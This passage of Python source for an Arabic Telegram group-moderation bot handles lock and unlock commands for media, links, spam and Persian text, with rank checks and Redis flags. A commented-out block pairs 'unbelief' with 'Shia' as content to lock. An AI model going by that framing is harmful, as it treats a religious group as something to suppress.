    if text == "فتح تعديل الميديا":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockEditM:{Dev_Zaid}"):
                return m.reply(Openn.format(k, m.from_user.mention, k, "تعديل الميديا"))
            else:
                r.delete(f"{m.chat.id}:lockEditM:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "تعديل الميديا"))

    if text == "قفل الفويسات" or text == "قفل البصمات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockVoice:{Dev_Zaid}"):
                return m.reply(lockn.format(k, m.from_user.mention, k, "الفويس"))
            else:
                r.set(f"{m.chat.id}:lockVoice:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الفويس"))

    if text == "فتح الفويسات" or text == "فتح البصمات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockVoice:{Dev_Zaid}"):
                return m.reply(Openn.format(k, m.from_user.mention, k, "الفويس"))
            else:
                r.delete(f"{m.chat.id}:lockVoice:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الفويس"))

    if text == "قفل الفيديو" or text == "قفل الفيديوهات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockVideo:{Dev_Zaid}"):
                return m.reply(lockn.format(k, m.from_user.mention, k, "الفيديو"))
            else:
                r.set(f"{m.chat.id}:lockVideo:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الفيديو"))

    if text == "فتح الفيديو" or text == "فتح الفيديوهات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockVideo:{Dev_Zaid}"):
                return m.reply(Openn.format(k, m.from_user.mention, k, "الفيديو"))
            else:
                r.delete(f"{m.chat.id}:lockVideo:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الفيديو"))

    if text == "قفل الاشعارات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockNot:{Dev_Zaid}"):
                return m.reply(locknn.format(k, m.from_user.mention, k, "الاشعارات"))
            else:
                r.set(f"{m.chat.id}:lockNot:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الاشعارات"))

    if text == "فتح الاشعارات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockNot:{Dev_Zaid}"):
                return m.reply(Openn2.format(k, m.from_user.mention, k, "الاشعارات"))
            else:
                r.delete(f"{m.chat.id}:lockNot:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الاشعارات"))

    if text == "قفل الصور":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockPhoto:{Dev_Zaid}"):
                return m.reply(locknn.format(k, m.from_user.mention, k, "الصور"))
            else:
                r.set(f"{m.chat.id}:lockPhoto:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الصور"))

    if text == "فتح الصور":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockPhoto:{Dev_Zaid}"):
                return m.reply(Openn2.format(k, m.from_user.mention, k, "الصور"))
            else:
                r.delete(f"{m.chat.id}:lockPhoto:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الصور"))

    if text == "قفل الملصقات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockStickers:{Dev_Zaid}"):
                return m.reply(locknn.format(k, m.from_user.mention, k, "الملصقات"))
            else:
                r.set(f"{m.chat.id}:lockStickers:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الملصقات"))

    if text == "فتح الملصقات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockStickers:{Dev_Zaid}"):
                return m.reply(Openn2.format(k, m.from_user.mention, k, "الملصقات"))
            else:
                r.delete(f"{m.chat.id}:lockStickers:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الملصقات"))

    if text == "قفل الفارسيه":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockPersian:{Dev_Zaid}"):
                return m.reply(locknn.format(k, m.from_user.mention, k, "الفارسيه"))
            else:
                r.set(f"{m.chat.id}:lockPersian:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الفارسيه"))

    if text == "فتح الفارسيه":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockPersian:{Dev_Zaid}"):
                return m.reply(Openn2.format(k, m.from_user.mention, k, "الفارسيه"))
            else:
                r.delete(f"{m.chat.id}:lockPersian:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الفارسيه"))

    if text == "قفل الملفات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockFiles:{Dev_Zaid}"):
                return m.reply(locknn.format(k, m.from_user.mention, k, "الملفات"))
            else:
                r.set(f"{m.chat.id}:lockFiles:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الملفات"))

    if text == "فتح الملفات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockFiles:{Dev_Zaid}"):
                return m.reply(Openn2.format(k, m.from_user.mention, k, "الملفات"))
            else:
                r.delete(f"{m.chat.id}:lockFiles:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الملفات"))

    if text == "قفل المتحركات" or text == "قفل المتحركه":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockAnimations:{Dev_Zaid}"):
                return m.reply(locknn.format(k, m.from_user.mention, k, "المتحركات"))
            else:
                r.set(f"{m.chat.id}:lockAnimations:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "المتحركات"))

    if text == "فتح المتحركات" or text == "فتح المتحركه":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockAnimations:{Dev_Zaid}"):
                return m.reply(Openn2.format(k, m.from_user.mention, k, "المتحركات"))
            else:
                r.delete(f"{m.chat.id}:lockAnimations:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "المتحركات"))

    if text == "قفل الروابط":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockUrls:{Dev_Zaid}"):
                return m.reply(locknn.format(k, m.from_user.mention, k, "الروابط"))
            else:
                r.set(f"{m.chat.id}:lockUrls:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الروابط"))

    if text == "فتح الروابط":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockUrls:{Dev_Zaid}"):
                return m.reply(Openn2.format(k, m.from_user.mention, k, "الروابط"))
            else:
                r.delete(f"{m.chat.id}:lockUrls:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الروابط"))

    if text == "قفل الهشتاق" or text == "قفل الهاشتاق":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockHashtags:{Dev_Zaid}"):
                return m.reply(lockn.format(k, m.from_user.mention, k, "الهاشتاق"))
            else:
                r.set(f"{m.chat.id}:lockHashtags:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الهاشتاق"))

    if text == "فتح الهشتاق" or text == "فتح الهاشتاق":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockHashtags:{Dev_Zaid}"):
                return m.reply(Openn.format(k, m.from_user.mention, k, "الهاشتاق"))
            else:
                r.delete(f"{m.chat.id}:lockHashtags:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الهاشتاق"))

    if text == "قفل البوتات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockBots:{Dev_Zaid}"):
                return m.reply(locknn.format(k, m.from_user.mention, k, "البوتات"))
            else:
                r.set(f"{m.chat.id}:lockBots:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "البوتات"))

    if text == "فتح البوتات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockBots:{Dev_Zaid}"):
                return m.reply(Openn2.format(k, m.from_user.mention, k, "البوتات"))
            else:
                r.delete(f"{m.chat.id}:lockBots:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "البوتات"))

    if text == "قفل اليوزرات" or text == "قفل المنشن":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockTags:{Dev_Zaid}"):
                return m.reply(locknn.format(k, m.from_user.mention, k, "اليوزرات"))
            else:
                r.set(f"{m.chat.id}:lockTags:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "اليوزرات"))

    if text == "فتح اليوزرات" or text == "فتح المنشن":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockTags:{Dev_Zaid}"):
                return m.reply(Openn2.format(k, m.from_user.mention, k, "اليوزرات"))
            else:
                r.delete(f"{m.chat.id}:lockTags:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "اليوزرات"))

    """
   if text == 'قفل الكفر' or text == 'قفل الشيعه' or text == 'قفل الشيعة':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if r.get(f'{m.chat.id}:lockKFR:{Dev_Zaid}'):
         return m.reply(locknn.format(k,m.from_user.mention,k,'الكفر'))
       else:
         r.set(f'{m.chat.id}:lockKFR:{Dev_Zaid}',1)
         return m.reply(lock.format(k,m.from_user.mention,k,'الكفر'))

   if text == 'فتح الكفر' or text == 'فتح الشيعه' or text == 'فتح الشيعة':
     if not admin_pls(m.from_user.id,m.chat.id):
       return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
     else:
       if not r.get(f'{m.chat.id}:lockKFR:{Dev_Zaid}'):
         return m.reply(Openn2.format(k,m.from_user.mention,k,'الكفر'))
       else:
         r.delete(f'{m.chat.id}:lockKFR:{Dev_Zaid}')
         return m.reply(Open.format(k,m.from_user.mention,k,'الكفر'))
   """

    if text == "قفل الإباحي" or text == "قفل الاباحي":
        if not owner_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المالك وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockNSFW:{Dev_Zaid}"):
                return m.reply(lockn.format(k, m.from_user.mention, k, "الإباحي"))
            else:
                r.set(f"{m.chat.id}:lockNSFW:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الإباحي"))

    if text == "فتح الإباحي" or text == "فتح الاباحي":
        if not owner_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المالك وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockNSFW:{Dev_Zaid}"):
                return m.reply(Openn.format(k, m.from_user.mention, k, "االإباحي"))
            else:
                r.delete(f"{m.chat.id}:lockNSFW:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الإباحي"))

    if text == "قفل الكلام الكثير" or text == "قفل الكلايش":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockMessages:{Dev_Zaid}"):
                return m.reply(lockn.format(k, m.from_user.mention, k, "الكلام الكثير"))
            else:
                r.set(f"{m.chat.id}:lockMessages:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الكلام الكثير"))

    if text == "فتح الكلام الكثير" or text == "فتح الكلايش":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockMessages:{Dev_Zaid}"):
                return m.reply(Openn.format(k, m.from_user.mention, k, "الكلام الكثير"))
            else:
                r.delete(f"{m.chat.id}:lockMessages:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الكلام الكثير"))

    if text == "قفل التكرار":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockSpam:{Dev_Zaid}"):
                return m.reply(lockn.format(k, m.from_user.mention, k, "التكرار"))
            else:
                r.set(f"{m.chat.id}:lockSpam:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "التكرار"))

    if text == "فتح التكرار":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockSpam:{Dev_Zaid}"):
                return m.reply(Openn.format(k, m.from_user.mention, k, "التكرار"))
            else:
                r.delete(f"{m.chat.id}:lockSpam:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "التكرار"))

    if text == "قفل التوجيه":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockForward:{Dev_Zaid}"):
                return m.reply(lockn.format(k, m.from_user.mention, k, "التوجيه"))
            else:
                r.set(f"{m.chat.id}:lockForward:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "التوجيه"))

    if text == "فتح التوجيه":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockForward:{Dev_Zaid}"):
                return m.reply(Openn.format(k, m.from_user.mention, k, "التوجيه"))
            else:
                r.delete(f"{m.chat.id}:lockForward:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "التوجيه"))

    if text == "قفل الانلاين":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockInline:{Dev_Zaid}"):
                return m.reply(lockn.format(k, m.from_user.mention, k, "الانلاين"))
            else:
                r.set(f"{m.chat.id}:lockInline:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الانلاين"))

    if text == "فتح الانلاين":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockInline:{Dev_Zaid}"):
                return m.reply(Openn.format(k, m.from_user.mention, k, "الانلاين"))
            else:
                r.delete(f"{m.chat.id}:lockInline:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الانلاين"))

    if text == "قفل السب":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockSHTM:{Dev_Zaid}"):
                return m.reply(lockn.format(k, m.from_user.mention, k, "السب"))
            else:
                r.set(f"{m.chat.id}:lockSHTM:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "السب"))

    if text == "فتح السب":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockSHTM:{Dev_Zaid}"):
                return m.reply(Openn.format(k, m.from_user.mention, k, "السب"))
            else:
                r.delete(f"{m.chat.id}:lockSHTM:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "السب"))

    if text == "قفل الاضافه" or text == "قفل الاضافة" or text == "قفل الجهات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockaddContacts:{Dev_Zaid}"):
                return m.reply(locknn.format(k, m.from_user.mention, k, "الاضافه"))
            else:
                r.set(f"{m.chat.id}:lockaddContacts:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الاضافه"))

    if text == "فتح الاضافه" or text == "فتح الاضافة" or text == "فتح الجهات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockaddContacts:{Dev_Zaid}"):
                return m.reply(Openn2.format(k, m.from_user.mention, k, "الاضافه"))
            else:
                r.delete(f"{m.chat.id}:lockaddContacts:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الاضافه"))

    if text == "قفل دخول البوتات" or text == "قفل الوهمي" or text == "قفل الايراني":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockJoinPersian:{Dev_Zaid}"):
                return m.reply(locknn.format(k, m.from_user.mention, k, "دخول البوتات"))
            else:
                r.set(f"{m.chat.id}:lockJoinPersian:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "دخول البوتات"))

    if text == "فتح دخول البوتات" or text == "فتح الوهمي" or text == "فتح الايراني":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockJoinPersian:{Dev_Zaid}"):
                return m.reply(Openn2.format(k, m.from_user.mention, k, "دخول البوتات"))
            else:
                r.delete(f"{m.chat.id}:lockJoinPersian:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "دخول البوتات"))

    if text == "قفل الصوت":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockAudios:{Dev_Zaid}"):
                return m.reply(lockn.format(k, m.from_user.mention, k, "الصوت"))
            else:
                r.set(f"{m.chat.id}:lockAudios:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الصوت"))

    if text == "فتح الصوت":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockAudios:{Dev_Zaid}"):
                return m.reply(Openn.format(k, m.from_user.mention, k, "الصوت"))
            else:
                r.delete(f"{m.chat.id}:lockAudios:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الصوت"))

    if text == "قفل القنوات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockChannels:{Dev_Zaid}"):
                return m.reply(locknn.format(k, m.from_user.mention, k, "القنوات"))
            else:
                r.set(f"{m.chat.id}:lockChannels:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "القنوات"))

    if text == "فتح القنوات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockChannels:{Dev_Zaid}"):
                return m.reply(Openn2.format(k, m.from_user.mention, k, "القنوات"))
            else:
                r.delete(f"{m.chat.id}:lockChannels:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "القنوات"))

    if text == "قفل الدخول":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockJoin:{Dev_Zaid}"):
                return m.reply(lockn.format(k, m.from_user.mention, k, "الدخول"))
            else:
                r.set(f"{m.chat.id}:lockJoin:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الدخول"))

    if text == "فتح الدخول":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockJoin:{Dev_Zaid}"):
                return m.reply(Openn.format(k, m.from_user.mention, k, "الدخول"))
            else:
                r.delete(f"{m.chat.id}:lockJoin:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الدخول"))

    if text == "تعطيل التحذير":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} التحذير معطل من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableWarn:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت التحذير\n☆"
                )

    if text == "تفعيل التحذير":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} التحذير مفعل من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:disableWarn:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت التحذير\n☆"
                )

    if text == "تعطيل اليوتيوب":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableYT:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} اليوتيوب معطل من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableYT:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت اليوتيوب\n☆"
                )

    if text == "تفعيل اليوتيوب":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:disableYT:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} اليوتيوب مفعل من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:disableYT:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت اليوتيوب\n☆"
                )

    if text == "تعطيل الساوند":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableSound:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} الساوند معطل من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableSound:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت الساوند\n☆"
                )

    if text == "تفعيل الساوند":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:disableSound:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} الساوند مفعل من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:disableSound:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت الساوند\n☆"
                )

    if text == "تعطيل الانستا":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableINSTA:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} الانستا معطل من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableINSTA:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت الانستا\n☆"
                )

    if text == "تفعيل الانستا":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:disableINSTA:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} الانستا مفعل من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:disableINSTA:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت الانستا\n☆"
                )

    if text == "تعطيل اهمس":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableWHISPER:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} اهمس معطل من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableWHISPER:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت اهمس\n☆"
                )

    if text == "تفعيل اهمس":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:disableWHISPER:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} اهمس مفعل من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:disableWHISPER:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت اهمس\n☆"
                )

    if text == "تعطيل التيك":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableTik:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} التيك معطل من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableTik:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت التيك\n☆"
                )

    if text == "تفعيل التيك":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:disableTik:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} التيك مفعل من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:disableTik:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت التيك\n☆"
                )

    if text == "تعطيل شازام":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableShazam:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} شازام معطل من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableShazam:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت شازام\n☆"
                )

    if text == "تفعيل شازام":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
